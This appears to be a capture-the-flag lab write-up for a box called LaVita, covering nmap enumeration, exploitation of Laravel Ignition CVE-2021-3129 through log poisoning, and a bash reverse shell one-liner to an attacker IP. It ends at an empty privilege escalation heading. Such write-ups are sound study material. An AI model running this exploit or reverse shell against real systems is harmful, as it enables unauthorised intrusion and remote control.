---
icon: linux
---

# LaVita

## Summary

* Only two open ports: SSH (22) and a Laravel-based web app on port 80.
* Identified Laravel log file path on the web server.
* Leveraged **CVE-2021-3129** – a[ Laravel deserialization RCE vulnerability ](https://pentest-tools.com/blog/exploit-rce-vulnerability-laravel-cve-2021-3129)via log poisoning and debugging mode.
* Achieved code execution through poisoned logs.
* Got reverse shell by modifying the exploit payload.



## 🧵 Let's Unpack

***

**Enumeration**

```bash
sudo nmap -A -T4 -sV -sC -p- -Pn 192.168.229.38 --open
```

Open Ports:

* `22/tcp` → OpenSSH 8.4p1 Debian
* `80/tcp` → Apache 2.4.56 (Laravel app)

👀 Observed a default **W3.CSS template** on HTTP page.

Manually enumerating team names from the web app:

* **Jan Ringo**
* **Kai Ringo**
* **Rebecca Flex**
* **Johnny Skunk**

> Useful for wordlists or user enumeration later.

***

**Initial Foothold**

🧨 Vulnerable Laravel app — exploited **CVE-2021-3129** (Ignition RCE via log file):

Public exploit used:\
→ Laravel Ignition RCE Exploit

```bash
python3 49424.py http://192.168.229.38 /var/www/html/laravel/storage/logs/laravel.log 'uname -a'
```

📌 After verifying command execution, updated payload with reverse shell:

```bash
bash -c "bash -i >& /dev/tcp/192.168.45.240/4444 0>&1"
```

Got a **reverse shell** from the web server.

***

**Privilege Escalation**
